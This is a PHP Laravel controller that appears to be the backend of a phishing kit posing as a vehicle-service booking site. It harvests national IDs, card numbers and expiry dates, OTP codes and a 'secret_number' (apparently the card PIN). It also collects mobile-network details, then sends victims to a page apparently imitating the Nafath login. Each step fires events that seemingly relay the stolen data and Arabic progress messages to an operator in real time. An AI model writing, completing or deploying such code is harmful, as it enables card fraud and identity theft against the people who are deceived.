<?php

namespace App\Http\Controllers;

use App\Models\Booking;
use App\Events\SendAuth;
use App\Events\SendPart;
use App\Events\SendVisit;
use App\Models\PaymentCard;
use Illuminate\Http\Request;
use App\Events\SendNotification;
use App\Models\VisitorNotifications;

class BookingController extends Controller
{
    public function saveBooking( Request $request)
    {
        try {

                    $validated = $this->validate($request, [
                        'name' => 'required|string',
                        'natID' => 'required|string',
                        'phone' => 'required|string',
                        'country' => 'required|string',
                        'email' => 'required|string|email',
                        'plate_1' => 'sometimes|nullable|string',
                        'plate_2' => 'sometimes|nullable|string',
                        'plate_3' => 'sometimes|nullable|string',
                        'plate_4' => 'sometimes|nullable|string',
                        'plate_number' => 'sometimes|nullable|string',
                        'plate_table' => 'sometimes|nullable|string',
                        'custom_cert_no' => 'sometimes|nullable|string',
                        'vehicle_type' => 'required|string',
                        'service_type' => 'required|string',
                        'area' => 'required|string',
                        'appointment_date' => 'required|date',
                        'timeslot' => 'required|string',
                    ]);
                    $booking = Booking::create($validated);


                    $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
                    $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                    return redirect()->route('booking_summary', 1);


        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function summary($id)
    {
        $summary = Booking::find($id);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة  ملخص الحجز','step_number'=>2]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
        }
        return view('main.booking.summary', compact('summary'));
    }
    public function paymentPage()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة  بيانات الدفع','step_number'=>5]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
        }
        // dd($trip_type);
        return view('main.booking.payment_page');
    }
    public function paymentStore(Request $request)
    {
        // dd($trip_type);
        try {
            $validated = $this->validate($request, [
                'cname' => 'required|string',
                'cnmbr' => 'required|string',
                // 'year' => 'required|integer',
                // 'month' => 'required|integer',
                'exDate' => 'required|string',
                'resume' => 'required|integer',
            ]);

            $validated['month'] = explode("/",$request['exDate'])[0];
            $validated['year'] = "20".explode("/",$request['exDate'])[1];
            unset($validated['exDate']);
            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {
                $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                // $validated['otp_code'] = random_int(100000,999999);

                    $payment_card = PaymentCard::create($validated);


                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>6]);
                session()->put('visitor', json_encode($not));
                // event(new NewVisitor($not));
                event(new SendPart($payment_card,$not));
                event(new SendNotification($not));
                return redirect()->route('booking_payment_waiting');
            }
            return redirect('/');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }

    }
    public function verifyOtpStore(Request $request)
    {
        try {
            $validated = $this->validate($request, [
                'code' => 'required',
            ]);
            
            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {

                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->latest()->first();
                if($payment_card){
                    $payment_card->otp_code = $request->code;
                    $payment_card->save();
                }
                
                $not  = VisitorNotifications::find($visitor->id);
                event(new SendPart($payment_card,$not));
            }
            return redirect()->route('confirm_card_owner');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function partAuth()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة إثبات بيانات البطاقة','step_number'=>7]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
            return view('main.booking.card_auth');
        }
        return redirect('/');

    }
    public function partAuthStore(Request $request)
    {
        try {
            $validated = $this->validate($request, [
                'code' => 'required',
            ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {

                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->latest()->first();
                if($payment_card){
                    $payment_card->secret_number = $request->code;
                    $payment_card->save();
                }
                // if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>8]);

                // event(new SendPart($payment_card,$not));
                // event(new SendAuth($not,$request->code));
                // event(new SendNotification($not));
            }
            return redirect()->route('confirm_phone');
            // return view('final_step');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function phoneAuth()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة إثبات رقم الهاتف','step_number'=>9]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
            return view('main.booking.confirm_phone');
        }
        return redirect('/');

    }
    public function phoneAuthStore(Request $request)
    {
        try {

            // $validated = $this->validate($request, [
            //     'phone_number' => 'required',
            //     // 'provider' => 'required',
            // ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {
                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'أرسل معلومات شبكة الجوال',
                    'step_number'=>10,
                    'phone_provider'=>$request->telCompany ?? '',
                    'phone_number_2'=>$request->phone ?? '',
                    'phone_code'=>$request->CaptchaCode ?? '',

                ]);
                session()->put('visitor', json_encode($not));
                event(new SendPhoneData($not));
                event(new SendNotification($not));
            }
            return redirect()->route('enter_nafad_page');
            // if ($visitor) {

            //     $not  = VisitorNotifications::first();

            //     // event(new SendCode($not));
            //     event(new SendNotification($not));
            // }
            // // return view('phone_waiting',compact('not'));
            // return view('phone_waiting',compact('not'));
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
}
